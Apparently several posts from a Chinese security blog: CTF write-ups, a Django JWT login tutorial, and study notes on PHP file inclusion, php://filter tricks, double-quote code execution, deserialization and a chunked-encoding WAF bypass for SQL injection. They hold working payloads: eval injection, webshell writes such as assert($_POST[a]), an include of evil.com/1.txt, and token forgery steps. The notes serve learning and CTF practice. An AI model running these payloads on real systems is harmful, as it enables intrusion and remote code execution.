$matches2[ 1 ] ) ) { $out_html .= $matches2[ 1 ]; } break; case 'else': if ( isset( $matches2[ 2 ] ) ) { $out_html .= $matches2[ 2 ]; } break; } } elseif ( $flag == 'if' ) { $out_html .= $matches[ 2 ][ $i ]; } $pattern2 = '/\\{if([0-9]):/'; if ( preg_match( $pattern2, $out_html, $matches3 ) ) { $out_html = str_replace( '{if' . $matches3[ 1 ], '{if', $out_html ); $out_html = str_replace( '{else' . $matches3[ 1 ] . '}', '{else}', $out_html ); $out_html = str_replace( '{end if' . $matches3[ 1 ] . '}', '{end if}', $out_html ); $out_html = $this-&gt;parserIfLabel( $out_html ); } $content = str_replace( $matches[ 0 ][ $i ], $out_html, $content ); } } return $content; } function splits( $s, $str=',' ) { if ( empty( $s ) ) return array( '' ); if ( strpos( $s, $str ) !== false ) { return explode( $str, $s ); } else { return array( $s ); } } 关键点在： 1@eval( 'if(' . $ifstr . '){$flag=&quot;if&quot;;}else{$flag=&quot;else&quot;;}' ); 此处应该可进行任意命令执行。 复制下来在本地调试，很容易就得到了EXP： 1/?a={if:true)echo%201;echo%20`cat%20/flag`;if(true}aaa{end%20if} babyunserialize这题比赛时也没做出来，也是赛后看的题解才学会的。 看来对于这种审计题还是自己太菜了，之后得找几个cms来练练。 jig.php的Jig类存在任意写两道，EXP： 12345678910111213141516171819&lt;?phpnamespace DB;class Jig { const FORMAT_JSON=0, FORMAT_Serialized=1; protected //! Storage location $dir = '/var/www/html/', //! Current storage format $format = self::FORMAT_JSON, //! Jig log $data = array(&quot;y1ng.php&quot;=&gt;array(&quot;a&quot;=&gt;&quot;&lt;?php phpinfo();?&gt;&quot;)), //! lazy load/save files $lazy = 1;}$jig = new Jig();echo urlencode(serialize($jig)); easytrick打开题目得到源代码： 12345678910111213141516&lt;?phpclass trick{ public $trick1; public $trick2; public function __destruct(){ $this-&gt;trick1 = (string)$this-&gt;trick1; if(strlen($this-&gt;trick1) &gt; 5 || strlen($this-&gt;trick2) &gt; 5){ die(&quot;你太长了&quot;); } if($this-&gt;trick1 !== $this-&gt;trick2 &amp;&amp; md5($this-&gt;trick1) === md5($this-&gt;trick2) &amp;&amp; $this-&gt;trick1 != $this-&gt;trick2){ echo file_get_contents(&quot;/flag&quot;); } }}highlight_file(__FILE__);unserialize($_GET['trick']); 这题比赛时没做出来，赛后看其他师傅的题解才学到，Y1ng师傅tql。 EXP： 12$tr-&gt;trick1 = NAN;$tr-&gt;trick2 = NAN; 后记这次比赛题目其实都不算难，但是自己的成绩还是不理想，隔壁的大师傅早AK了，orz。 太菜了。","link":"/2020/CISCN%202020%20Web%20WriteUp/"},{"title":"Django基于JWT实现微信小程序的登录和鉴权","text":"什么是JWT?JWT，全称Json Web Token，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。 与Session的区别一、Session是在服务器端的，而JWT是在客户端的，这点很重要。二、流程不同： JWT使用场景 大量需要进行跨域的站点 服务器运算能力较差、存储空间较小 JWT的原理JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。12345{ &quot;姓名&quot;: &quot;张三&quot;, &quot;角色&quot;: &quot;管理员&quot;, &quot;到期时间&quot;: &quot;2018年7月1日0点0分&quot;}以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名（详见后文）。 服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。 JWT数据的格式实际的 JWT 大概就像下面这样。 它是一个很长的字符串，中间用点（.）分隔成三个部分。注意，JWT 内部是没有换行的，这里只是为了便于展示，将它写成了几行。 JWT 的三个部分依次如下。 Header（头部） Payload（负载） Signature（签名） HeaderHeader 部分是一个 JSON 对象，描述 JWT 的元数据，通常是下面的样子。 1234{ &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;} 上面代码中，alg属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；typ属性表示这个令牌（token）的类型（type），JWT 令牌统一写为JWT。 最后，将上面的 JSON 对象使用 Base64URL 算法（详见后文）转成字符串。 PayloadPayload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。 iss (issuer)：签发人 exp (expiration time)：过期时间 sub (subject)：主题 aud (audience)：受众 nbf (Not Before)：生效时间 iat (Issued At)：签发时间 jti (JWT ID)：编号 除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。 12345{ &quot;sub&quot;: &quot;1234567890&quot;, &quot;name&quot;: &quot;John Doe&quot;, &quot;admin&quot;: true} 注意，JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。 这个 JSON 对象也要使用 Base64URL 算法转成字符串。 SignatureSignature 部分是对前两部分的签名，防止数据篡改。 首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。 1234HMACSHA256( base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret) 算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（.）分隔，就可以返回给用户。 Base64URL前面提到，Header 和 Payload 串型化的算法是 Base64URL。这个算法跟 Base64 算法基本类似，但有一些小的不同。 JWT 作为一个令牌（token），有些场合可能会放到 URL（比如 api.example.com/?token=xxx）。Base64 有三个字符+、/和=，在 URL 里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_ 。这就是 Base64URL 算法。 JWT的使用方式客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。 此后，客户端每次与服务器通信，都要带上这个 JWT。你可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求的头信息Authorization字段里面。1Authorization: Bearer &lt;token&gt;另一种做法是，跨域的时候，JWT 就放在 POST 请求的数据体里面。 JWT 的几个特点（1）JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。 （2）JWT 不加密的情况下，不能将秘密数据写入 JWT。 （3）JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。 （4）JWT 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦 JWT 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。 （5）JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。 （6）为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。 内容说明以上主要内容转载于廖雪峰的网络日志 实例：使用Django完成微信小程序的JWT登录及鉴权网上目前已经有了一些文章来说明了，可是我在查阅的时候发现大多讲得不是很清楚。 基本了解通过之前的内容铺垫，相信读者对于JWT都有了一定的了解，总的来说，便是JWT是保存在用户端的Token机制。 需要注意的是：JWT默认是无加密的，只是使用了一层Base64编码，所以我们不能将重要信息，如密码等放入header和payload字段中。 开始对于Django来说，这里我们使用djangorestframework-jwt库 安装命令：1pip install djangorestframework-jwt注意djangorestframework-jwt库默认将settings里的SECRET_KEY当中jwt加密秘钥。 首先我们先去我们的project下的settings文件内设置jwt库的一些参数12345678910111213import datetime# 在末尾添加上REST_FRAMEWORK = {'DEFAULT_AUTHENTICATION_CLASSES': ( 'rest_framework_jwt.authentication.JSONWebTokenAuthentication',# JWT认证，在前面的认证方案优先 'rest_framework.authentication.SessionAuthentication', 'rest_framework.authentication.BasicAuthentication', ),}JWT_AUTH = { 'JWT_EXPIRATION_DELTA': datetime.timedelta(days=1), #JWT_EXPIRATION_DELTA 指明token的有效期}登录函数的实现：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162'''登录函数：'''def get_user_info_func(user_code): api_url = 'https://api.weixin.qq.com/sns/jscode2session?appid={0}&amp;secret={1}&amp;js_code={2}&amp;grant_type=authorization_code' get_url = api_url.format(App_id,App_secret,user_code) r = requests.get(get_url) return r.json()@require_http_methods(['POST'])def user_login_func(request): try: user_code = request.POST.get('user_code') print(user_code) if user_code == None: print(request.body) json_data = json.loads(request.body) user_code = json_data['user_code'] print(user_code) except: return JsonResponse({'status':500,'error':'请输入完整数据'}) try: json_data = get_user_info_func(user_code) #json_data = {'errcode':0,'openid':'111','session_key':'test'} if 'errcode' in json_data: return JsonResponse({'status': 500, 'error': '验证错误：' + json_data['errmsg']}) res = login_or_create_account(json_data) return JsonResponse(res) except: return JsonResponse({'status':500,'error':'无法与微信验证端连接'})def login_or_create_account(json_data): openid = json_data['openid'] session_key = json_data['session_key'] try: user = User.objects.get(username=openid) except: user = User.objects.create( username=openid, password=openid, ) user.session_key = session_key user.save() try: jwt_payload_handler = api_settings.JWT_PAYLOAD_HANDLER jwt_encode_handler = api_settings.JWT_ENCODE_HANDLER payload = jwt_payload_handler(user) token = jwt_encode_handler(payload) res = { 'status': 200, 'token': token } except: res = { 'status': 500, 'error': 'jwt验证失败' } return res视图函数：123456789101112131415161718192021222324252627282930313233343536373839'''视图样例：'''from django.http import JsonResponsefrom account.models import *from rest_framework_jwt.views import APIViewfrom rest_framework import authenticationfrom rest_framework.permissions import IsAuthenticatedfrom rest_framework_jwt.authentication import JSONWebTokenAuthenticationfrom rest_framework import permissionsclass IsOwnerOrReadOnly(permissions.BasePermission): def has_object_permission(self, request, view, obj): if request.method in ['GET','POST']: return True return obj.user == request.userclass test_view(APIView): http_method_names = ['post'] #限制api的访问方式 authentication_classes = (authentication.SessionAuthentication,JSONWebTokenAuthentication) permission_classes = (IsAuthenticated,IsOwnerOrReadOnly) #权限管理 def post(self,request): #视图函数 user = request.user.username U = User.objects.get(username=user) json_data = json.loads(request.body) try: test = json_data[''] except: return JsonResponse({'status':500,'errmsg':'参数不全'}) try: U.sex = sex U.weight = weight U.height = height U.save() except: return JsonResponse({'status': 500, 'errmsg': '数据库错误'}) return JsonResponse({'status':200})urls.py:12345urlpatterns = [ re_path('^$', index), re_path('^login$',login), # 登录 re_path('^test$',test_view.as_view())] 从一道CTF引发的对JWT安全的简单思考引例题目：2019ISCC Web6 解题关键： 改题的加密方式为：RS256，是一种非对称加密，分有公钥和私钥。 其中： 私钥加密 公钥解密 当公钥泄露时，将JWT中的Header部分算法改为对称加密，攻击者本地使用泄露的公司进行Token伪造，将获取到的Token发送给验证端时，会使用公钥按照Header中的算法进行解密，而在原来的Header中算法为RS256，需要私钥加密生成Token，可是当我们修改为对称加密的HS256时，我们便可以成功伪造Token，且服务端也可以正常验证。 产生这一问题的主要原因便是，HWT的Header段是可控制的，通常只经过一层base64编码处理，也就是说解密算法可有用户控制。 防御：保护公钥不泄露，将Header段经RSA等方法加密。 其他问题 密钥可控 密钥爆破 特殊情况，不做深入，感兴趣的可见https://www.anquanke.com/post/id/145540#h3-9","link":"/2019/Django%E5%9F%BA%E4%BA%8EJWT%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%99%BB%E5%BD%95%E5%92%8C%E9%89%B4%E6%9D%83/"},{"title":"PHP 本地文件包含(LFI)漏洞学习笔记","text":"前言很久之前就想写这篇文章了，这次正好接着这个国庆假期就好好写一写，给自己加深写印象。 正文引子何为LFI？全程Local File Inclusion，中文译作本地文件包含漏洞。 既然是包含漏洞，那肯定少不了包含的函数。在PHP中，通常是下面四个包含函数： 1234include()include_once()require()require_once() 这四个函数功能相近，其中带_once的函数与不带_once的函数区别在于：对于前者不会进行重复引用，故而造成某些变量覆盖问题。而include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。 两种文件包含既然我们可以选择任意文件进行包含，如果我们选择一个webshell的话，那么岂不是就能拿到网站的控制权限？ 本地包含最简单的，我们可以通过上传一个包含webshell内容的图片，然后通过包含此图片即可得到一个可以控制的webshell。 除了上传恶意文件以外，我们也可以通过包含一些日志服务产生的日志文件。常用的有： 1234567/proc/self/environ/proc/self/fd/1,2,3,4...# ssh日志，攻击方法：# ssh `&lt;?php phpinfo(); ?&gt;`@192.168.1.1/var/log/auth.log# apache日志/var/log/apache2/[access.log|error.log] session文件包含 此方法需要PHP版本&gt;5.4.0、配置项：session.upload_progress.enabled的值为On、代码中存在session_start函数，不过好在其默认值为On。 此方法的作用是记录上传文件时的一些信息之用。 当我们在上传文件时，若存在一个上传的字段名与session.upload_progress.name的值相同的话，当前文件的上传进度信息将会保存在$_SESSION中获得。 如： 12345&lt;form action=&quot;http://127.0.0.1/1.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php phpinfo(); ?&gt;&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; 此时，在相应的session文件中，就会存有我们上传的恶意代码。 session默认位置：/var/lib/php/sessions/sess_[Cookie中PHPSESSID的值]。 tmp临时文件包含 同样是上传文件，当PHP遇到enctype=&quot;multipart/form-data时，会产生临时文件来保存上传文件内容，等上传结束后再执行相应操作（及时当前php文件不存在php代码，同样会产生临时文件）。 临时文件默认目录为： Linux：/tmp/php[w]{6} Windows：C:/Windows/php[4个随机字符].tmp 法一：分段传输防止临时文件删除过快。 需要提前知道临时文件的具体位置（上传位置填phpinfo文件时，回显内容中会提供）。 法二：PHP异常崩溃 上传位置填LFI文件 123451. 7.0.0 &lt;= PHP Version &lt; 7.0.28php://filter/string.strip_tags/resource=/etc/passwd2. php7 老版本通杀php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA 第一种是由于： php代码中使用php://filter的过滤器strip_tags , 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不想phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。 当PHP异常退出后，就可以编写脚本，通过遍历文件来尝试包含后getshell了。 远程包含利用前提（与data协议的利用前提相同）： allow_url_fopen = On 是否允许打开远程文件 allow_url_include = On 是否允许include/require远程文件 若 allow_url_fopen为Off，而allow_url_include为On，可以直接利用php://input执行恶意代码。 利用过程： 在公网上比如evil.com/1.txt存放恶意webshell，通过包含http://evil.com/1.txt即可执行恶意payload。 PHP伪协议简单入门何为伪协议？简单的说，就是自己定义的协议，也只有自己的软件支持，其他软件都不识别的协议就是伪协议。 在PHP中，PHP给自己定义了一个php伪协议，以：php://起头。 至于http://、file://这些都不是伪协议，都是大部分系统/软件都支持的协议，共享同一套协议标准。 当然，也不只是只有包含函数能使用，类似其他许多涉及到文件读取/写入的函数都可能存在问题，这里我再列举出一些也可以使用PHP伪协议的函数： file_get_contents file_put_contents readfile fopen file show_source或highlight_file 需注意的是： 123456&lt;?phpshow_source($_GET['yunen']); # 有回显file_get_contents($_GET['yunen']); # 无回显echo file_get_contents($_GET['yunen']); # 有回显?&gt;# show_source相当于自带输出功能，而file_get_contents并没有。 php://filter官方定义如下： php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 php://filter 目标使用以下的参数作为它路径的一部分。复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。 简单的说就是php伪协议的过滤器功能，可以通过拼接各种过滤器达到快速转换字节流的效果。如： 123&lt;?phpinclude($_GET['file']);# ?file=php://filter/read=convert.base64-encode/resource=flag.php 此时php会读取flag.php文件内容后，通过convert过滤器的base64-encode方法，最总将所得结果以php代码的形式包含到运行的php文件之中，由于base64编码之后的内容不会出现&lt;?，所以必然不会被识别为php代码，故而能起到文件读取的作用。 php://input前提：allow_url_include=On，PHP版本&gt;5.2后，默认值为Off。 此方法相当于取HTTP数据包的BODY数据（即POST数据）。如： 123&lt;?phpecho file_get_contents($_GET['yunen']);?&gt; 如下图： 注意，此协议也可直接执行恶意代码： 123456&lt;?phpinclude($_GET['f']);?&gt;#URL: /lfi.php?f=php://input#POST DATA: &lt;?php phpinfo();?&gt; php伪协议进阶学习从这开始后文可能会有点乱，因为我实在不知道如何按什么顺序来写，只好想到哪写到哪了。 过滤器列表对于php://来说，支持多种过滤器嵌套，其格式为： 123php://filter/[read|write]=[过滤器1]|[过滤器2]/resource=文件名称（包含后缀名）# 过滤|的情况下，使用多过滤器：php://filter/string.rot13/resource=php://filter/convert.base64-encode/resource=文件名称 其中filter/[read|write]=[过滤器]可简写为filter/[过滤器]，php会自选判断是read还是write。 而对于过滤器来说，php伪协议主要支持以下几类： 字符串过滤器 string.strip_tags（PHP7.3.0废弃） 转换过滤器 压缩过滤器 加密过滤器 嵌套过程的执行流程为从左到右。常用的过滤器有： 过滤器名称 说明 类别 版本 string.rot13 rot13转换 字符串过滤器 PHP&gt;4.3.0 string.toupper、string.tolower 大小写互转 字符串过滤器 PHP&gt;5.0.0 string.strip_tags 去除&lt;?(.*?)?&gt;的内容 string.strip_tags PHP&lt;7.3.0 convert.base64-encode、convert.base64-decode base64编码转换 转换过滤器 PHP&gt;5.0.0 convert.quoted-printable-encode、convert.quoted-printable-decode URL编码转换 转换过滤器 PHP&gt;5.0.0 convert.iconv.编码1.编码2 任意编码转换 转换过滤器 PHP&gt;5.0.0 zlib.deflate、zlib.inflate zlib压缩 压缩过滤器 PHP&gt;5.1.0 bzip2.compress、bzip2.decompress zlib压缩 压缩过滤器 PHP&gt;5.1.0 file_put_contents对于写出函数来说，php伪协议同样可以执行，此考点以死亡exit最为出名，常在CTF中碰见。 例子： 12345&lt;?php$filename=$_GET['filename'];$content=$filename;file_put_contents($filename,'&lt;php exit()?&gt;'.$content);?&gt; 如何跳出死亡exit，让程序执行我们人为定义的代码？ 法一：convert.base64-decode过滤器 此方法需要注意，convert.base64-decode过滤器的特殊规则： 遇到除[a_zA-Z0-9_/]之外的字符通通忽略不计 每4个字符作为一组进行解码，最后一组可不满4个字符 等号后边不允许接除了等号以外的任何内容，如：=a √、== ×。 而对于上题来说，php://filter/write=此处的等号可以简写成：php://filter/，但是后边的resource=文件名却不能简写或去掉。 可以配合convert.quoted-printable-decode过滤器，将等号吞掉，如： 123456&lt;?php$fp = fopen('php://output', 'w');stream_filter_append($fp, 'convert.quoted-printable-decode');fwrite($fp, &quot;/resource=aaaPD9waHAgZXZhbCgkX0dFVFsxXSk7LyogPz4&quot;);/* Outputs: /resourceªaPD9waHAgZXZhbCgkX0dFVFsxXSk7LyogPz4 */?&gt; 其中的ª为=aa经过convert.quoted-printable-decode过滤器转换而得。 而对于后边的convert.base64-decode过滤器来说，ª为可忽略字符，故在不影响后续转换的前提下将等号吞掉了，类似于宽字节SQL注入的原理。 法二：convert.iconv.utf-8.utf-7过滤器 此过滤器会将等号转换成+AD0-，从而避开了后边的resource=文件名的影响。 payload1： 1php://filter/PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=yunen.php 此方法需要求： 包含函数不能为require，因为不存在PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+过滤器。 而对于PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+处，注意不能出现等号，因为可能会影响前边的base64数据，可在编码前的数据尾添加一些垃圾数据防止影响（base64分段编码特性）。 法三：usc-2、usc-4过滤器 payload1： 1php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=s1mple.php; payload2： 1php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@%20p(lavOP_$s[TS]pm1&gt;?;)/resource=s1mple.php 摘自：file_put_content和死亡·杂糅代码之缘 法四：string.strip_tags过滤器 payload： 1php://filter/string.strip_tags/resource=?&gt;/../yunen.php 前提条件： PHP版本&lt;7.3.0 Linux服务器（Windows不允许文件夹/文件名带?与&gt;。） 法五：zlib.deflate|string.tolower|zlib.inflate压缩解压过滤器 payload： 1php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0dphpinfo();?&gt;/resource=2.php 原理：先通过zlib将流数据进行压缩，再讲其中的大写字母转小写后进行解压，所得数据与最初发数据会产生部分差别，故&lt;?php exit()将会变成&lt;?php@厁it();。 其他协议除了php伪协议外，PHP还支持包含以下协议的数据流： 1234567891011file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLszlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 限制包含文件的后缀名在CTF题中，经常遇到限制了后缀的，如： 123&lt;?phpinclude($_GET['f'].'.php');?&gt; 可是我们却无法上传php文件，该如何利用呢？ 法一：00截断 前提：PHP版本&lt;5.3.4 1lfi.php?f=shell.txt%00 法二：长度截断 前提：PHP版本&lt;5.2.10 (?) 操作系统对于目录字符串存在长度限制，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复./即可： 12lfi.php?file=././././[./]+/./shell.txtlfi.php?file=./shell.txt/.[...]+. # 仅Windows下有效 法三：zip、phar协议 zip与phar协议均不在意所选定文件的后缀名。 12zip://文件路径/zip文件名称#压缩包内的文件名称 （使用时注意将#号进行URL编码）phar://文件路基/phar文件名称/phar内的文件名称 参考 PHP手册-支持的协议和封装协议 PHP文件包含漏洞总结 file_put_content和死亡·杂糅代码之缘 LFItoRCE利用总结 浅析php文件包含及其getshell的姿势 谈一谈php://filter的妙用 探索php://filter在实战当中的奇技淫巧 1.39 文件包含漏洞 PHP LFI 利用临时文件 Getshell 姿势 文件包含一些常识","link":"/2020/PHP%20%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(LFI)%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"PHP中双引号引起的命令执行漏洞","text":"前言在PHP语言中，单引号和双引号都可以表示一个字符串，但是对于双引号来说，可能会对引号内的内容进行二次解释，这就可能会出现安全问题。 正文举个简单例子 123456&lt;?php$a = 1;$b = 2;echo '$a$b';//输出结果为$a$becho &quot;$a$b&quot;;//输出结果为12?&gt; 可以看到这两个输出的结果并不相同。 在双引号中倘若有${}出现，那么{}内的内容将被当做代码块来执行。可以看到成功执行了phpinfo() 试想一下，倘若在一个cms的后台，可以修改数据库的配置文件，且配置文件中的值用双引号包括，我们虽然也可以直接闭合代码达到getshell的后果，但是如果cms对传递的参数进行了addlashes()处理的话，我们就无法去闭合代码了，但这时我们可以传入${命令}就可以达到getshell的目的。 现在，让我们来修改一下代码，让我们不只能输出phpinfo1&lt;?php echo &quot;${@assert($_POST[a])}&quot;;?&gt; //@是用来防止输出错误信息的菜刀成功连接 总结本文简单记录了双引号可能会引发的代码执行的情况对于这种漏洞的防御，一定要明确单引号与双引号的区别所在，不要简单认为两者是互相可以替代的，在平时的代码书写中能只用单引号一定不要用双引号，毕竟单引号的解释时间也比双引号少得多，代码运行相对更快。","link":"/2018/PHP%E4%B8%AD%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%BC%95%E8%B5%B7%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"title":"PHP反序列化漏洞的简单学习","text":"在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。 PHP序列化与反序列化谈到PHP序列化与反序列化那么必须涉及到两个函数serialize()与unserialize()前者是将一个对象进行序列化后者是其反过程 serialize()先来看看此函数的解释函数返回的是一串字符串，可以对如数组和对象进行序列化处理 下面给出两个例子 1234567&lt;?php //对数组进行序列化$a = array('a' =&gt; 'Apple' ,'b' =&gt; 'banana' , 'c' =&gt; 'Coconut');//序列化数组$s = serialize($a);echo $s;//输出结果：a:3:{s:1:&quot;a&quot;;s:5:&quot;Apple&quot;;s:1:&quot;b&quot;;s:6:&quot;banana&quot;;s:1:&quot;c&quot;;s:7:&quot;Coconut&quot;;}?&gt; 12345678910&lt;?phpclass name1 { var $test1; var $test2;}$test3 = new name1;$test3-&gt;test1 = 'hack ';$test3-&gt;test2 = 'fun';echo serialize($test3); //输出结果：O:5:&quot;name1&quot;:2:{s:5:&quot;test1&quot;;s:5:&quot;hack &quot;;s:5:&quot;test2&quot;;s:3:&quot;fun&quot;;} 对于序列化后得到的字符串解释如图 unserialize()将已序列化的字符串进行反序列，即恢复序列化前123456789&lt;?phpclass name1 { var $test1; var $test2;}$str = 'O:5:&quot;name1&quot;:2:{s:5:&quot;test1&quot;;s:5:&quot;hack &quot;;s:5:&quot;test2&quot;;s:3:&quot;fun&quot;;}';$ser = unserialize($str);print_r($ser);?&gt; 反序列化漏洞看似安全的序列化其实存在漏洞，而且一旦能利用就一般危害不小，在代码审计中我们需要格外注意此类型漏洞。序列化漏洞常见的魔法函数 1234567construct():当一个类被创建时自动调用destruct():当一个类被销毁时自动调用invoke():当把一个类当作函数使用时自动调用tostring():当把一个类当作字符串使用时自动调用wakeup():当调用unserialize()函数时自动调用sleep():当调用serialize()函数时自动调用__call():当要调用的方法不存在或权限不足时自动调用 简单测试如下：1234567891011121314151617181920212223&lt;?phpclass chybeta{ var $test = '123'; function __wakeup(){ echo &quot;__wakeup&quot;; echo &quot;&lt;/br&gt;&quot;; } function __construct(){ echo &quot;__construct&quot;; echo &quot;&lt;/br&gt;&quot;; } function __destruct(){ echo &quot;__destruct&quot;; echo &quot;&lt;/br&gt;&quot;; }}$class2 = 'O:7:&quot;chybeta&quot;:1:{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}'; print_r($class2);echo &quot;&lt;/br&gt;&quot;;$class2_unser = unserialize($class2);print_r($class2_unser);echo &quot;&lt;/br&gt;&quot;;?&gt;由前可以看到，unserialize()后会导致wakeup() 或destruct()的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在wakeup() 或destruct()中，从而当我们控制序列化字符串时可以去直接触发它们。(这里因为懒直接照搬了某大佬的原文） 绕过魔法函数魔法函数sleep() 和 wakeup()php文档中定义__wakeup():unserialize() 执行时会检查是否存在一个 wakeup() 方法。如果存在，则会先调用 wakeup 方法，预先准备对象需要的资源。wakeup()经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。sleep()则相反，是用在序列化一个对象时被调用.正常情况下的反序列化来漏洞如下图：析构方法和__wakeup都能够执行如果我们把传入的序列化字符串的属性个数更改成大于1的任何数 1O:7:&quot;hpdoger&quot;:2:{s:1:&quot;a&quot;;s:6:&quot;u know&quot;;} 得到的结果如图，__wakeup没有被执行，但是执行了析构函数 反序列化漏洞实战 南邮CTF123456789101112131415161718192021222324&lt;?phpclass just4fun { //定义了一个类 var $enter; var $secret;}if (isset($_GET['pass'])) { $pass = $_GET['pass']; if(get_magic_quotes_gpc()){ $pass=stripslashes($pass); } $o = unserialize($pass); //进行反序列化处理 if ($o) { $o-&gt;secret = &quot;*&quot;; //这里不知道*代表的是啥 if ($o-&gt;secret === $o-&gt;enter) //要求$o中的两个属性值相同 echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret; else echo &quot;Oh no... You can't fool me&quot;; } else echo &quot;are you trolling?&quot;;}?&gt; 由于我们不知道*代表的是什么，故我们需要用指针来直接使两属性相等。123456789&lt;?phpclass just4fun { var $enter; var $secret;}$o = new just4fun;$o-&gt;enter = &amp;$o-&gt;secret; //这里的a=&amp;b 即代表将b的指针赋值给a 无论b的值怎么变 a始终等于becho serialize($o);?&gt; 本地运行即可得到序列化字符串O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}然后将此作为pass参数GET发送即可获得flag","link":"/2018/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"title":"SQL注入使用Django中继数据包bypassWAF","text":"原理本人基于文章bypassword的文章在HTTP协议层面绕过WAF所编写一款工具。 环境 Python3.7.0 Django 2.1 Requests 使用范围 POST注入 可以分块传输的漏洞网站 使用方法修改图中圈中的部分，Evil_Url为存在注入的地址，Domain为其域名部分。 实例靶机环境:PHP5.4+Apache2.2+Mysql5+WAF:首先部署Django：其次将注入点换成部署的Url：如：http://192.168.32.144/2.php存在POST注入，注入参数为id，部署的Url为http://127.0.0.1:8000/Sqlmap命令为python sqlmap.py -u &quot;http://127.0.0.1:8000/&quot; --data &quot;id=1&quot; 支持-r xx.txt需要修改请求头中的Host地址为Django部署的地址 下载地址：https://github.com/HackerYunen/Django-chunked-sqli此项目我不断更新完善，欢迎Star、Issue TODO 暂无 解疑为什么使用Django？因为我只会Django 